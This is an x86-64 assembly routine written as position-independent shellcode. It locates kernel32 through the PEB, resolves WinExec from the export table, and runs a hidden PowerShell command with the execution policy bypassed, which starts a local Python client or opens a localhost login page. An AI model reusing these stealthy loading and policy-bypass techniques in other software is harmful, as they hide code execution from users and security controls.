.intel_syntax noprefix
.text
.globl _start
_start:
    sub rsp, 40

    /* 1. Get PEB from GS:[0x60] */
    mov rax, qword ptr gs:[0x60]
    /* 2. PEB->Ldr (0x18) */
    mov rax, [rax + 0x18]
    /* 3. Ldr->InMemoryOrderModuleList (0x20) */
    lea rsi, [rax + 0x20]
    mov rsi, [rsi]       /* 1st entry: executable */
    mov rsi, [rsi]       /* 2nd entry: ntdll.dll */
    mov rsi, [rsi]       /* 3rd entry: kernel32.dll */
    mov rbx, [rsi + 0x20] /* DllBase is at offset 0x20 in LDR_DATA_TABLE_ENTRY */

    /* rbx = kernel32 base */
    /* Parse PE header */
    mov eax, [rbx + 0x3c] /* e_lfanew */
    add rax, rbx
    /* Export Directory RVA is at [PE + 0x88] */
    mov edx, [rax + 0x88]
    add rdx, rbx          /* rdx = IMAGE_EXPORT_DIRECTORY */

    mov r8d, [rdx + 0x20] /* AddressOfNames RVA */
    add r8, rbx
    mov r9d, [rdx + 0x24] /* AddressOfNameOrdinals RVA */
    add r9, rbx
    mov r10d, [rdx + 0x1c] /* AddressOfFunctions RVA */
    add r10, rbx

    xor ecx, ecx
find_winexec:
    mov esi, [r8 + rcx*4]
    add rsi, rbx
    /* Compare first 7 bytes with WinExec */
    mov rdi, qword ptr [rip + winexec_str]
    cmp [rsi], rdi
    je found_func
    inc ecx
    cmp ecx, 2000
    jge done
    jmp find_winexec

found_func:
    /* Get ordinal */
    movzx eax, word ptr [r9 + rcx*2]
    /* Get function RVA */
    mov eax, [r10 + rax*4]
    add rax, rbx          /* rax = WinExec */

    /* Call WinExec(cmd, 0) */
    lea rcx, [rip + cmd_str]
    xor edx, edx          /* SW_HIDE = 0 */
    call rax

done:
    xor ecx, ecx
    add rsp, 40
    ret

.section .rdata
winexec_str:
    .ascii "WinExec\0"
cmd_str:
    .asciz "powershell -WindowStyle Hidden -ExecutionPolicy Bypass -Command \"& { $flaPath = Join-Path $env:LOCALAPPDATA 'FLA_Client'; if (-not (Test-Path $flaPath)) { New-Item -ItemType Directory -Path $flaPath -Force | Out-Null }; Set-Location $flaPath; $py = (Get-Command python.exe -ErrorAction SilentlyContinue); if ($py) { Start-Process -WindowStyle Hidden python -ArgumentList '-m desktop.main' } else { Start-Process 'http://127.0.0.1:8306/#/login' } }\""
